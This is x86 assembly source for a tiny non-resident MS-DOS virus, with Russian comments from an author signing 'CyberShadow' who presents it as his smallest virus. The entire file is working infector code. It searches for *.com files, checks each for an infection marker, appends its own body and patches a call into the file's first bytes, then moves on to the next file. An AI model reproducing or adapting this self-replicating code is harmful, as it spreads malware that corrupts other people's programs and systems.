.model tiny
.code
org 100h
;┌─────────────────────────────────────────────────────────────────────────────┐
;│ Ага, интересуетесь маленькими вирусами? Ну что ж, смотрите и наслаждайтесь, │
;│ мой самый  маленький вирусочек, разумеется  нерезидент (маленькие резиденты │
;│ мне неинтересны,потому как сам GOD велел их делать маленькими!) Enjoy it... │
;│                                                    CyberShadow...           │
;└─────────────────────────────────────────────────────────────────────────────┘
;--------------------------------------
Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start

;--------------------------------------
Begin:  call Start
Start:
        pop DI
        mov BP,3
	mov si,di
        sub DI,BP               ;DI=100h
        push DI
;      --------------------------------
        add SI,DS:[di+1]        ;┐
        push SI                 ;┘
;      --------------------------------
        add SI,Const1           ;┐
        push SI                 ;│
        movsw                   ;│ пеpеписали пpавильные
        movsb                   ;┘    пеpвые 3 байта.
;      --------------------------------
        mov DX,SI               ;┐
        mov AH,4eh              ;│
        int 21h                 ;│
        pop SI DI               ;┘
;--------------------------------------
Next:   mov DX,9eh              ;┐
        mov AX,3d02h            ;│ откpыли ф.
        int 21h                 ;│
        xchg bx,ax
;      --------------------------------
        mov DX,SI               ;┐
        mov CX,BP               ;│ читаем пеpвые 3 байта
        mov AH,3fh              ;│
        int 21h                 ;┘
;      --------------------------------
        cmp byte ptr [si],0e8h  ;Проверились на заражение
        je short close_file     ;(если его убрать будет размер меньше,
                                ;но у него и так корректности мало...)
        dec ax
        call Proc1              ;│ пеpеместились
        sub SI,BP               ;│  на конец ф.
        sub AX,BP               ;│
        mov [SI+1],AX           ;┘
;      --------------------------------
        mov DX,DI               ;┐
        mov Cl,Const2           ;│
        mov AH,40h              ;│ записали тело
        int 21h                 ;┘
;      --------------------------------
        mov AL,0                ;┐ пеpеместились
        call Proc1              ;┘ на начало ф.
;      --------------------------------
        mov DX,SI               ;┐
        mov CX,BP               ;│   поставили call
        mov AH,40h              ;│     в начале ф
        int 21h                 ;┘
;      --------------------------------
        add si,bp
close_file:
        mov AH,3eh              ;┐ закpыли ф
        int 21h                 ;│
        mov AH,4fh              ;│
        int 21h                 ;│ следующий ф
        jnc short next          ;┘
Proc1:  cwd               ;Курсор в ф.
        sub CX,CX
        mov AH,42h
        int 21h
        ret
;--------------------------------------
Jump:   call Begin
FreeByte:
        nop
        nop
        ret
Fname   db '*.com',0
EndVirus:
;--------------------------------------
end begin
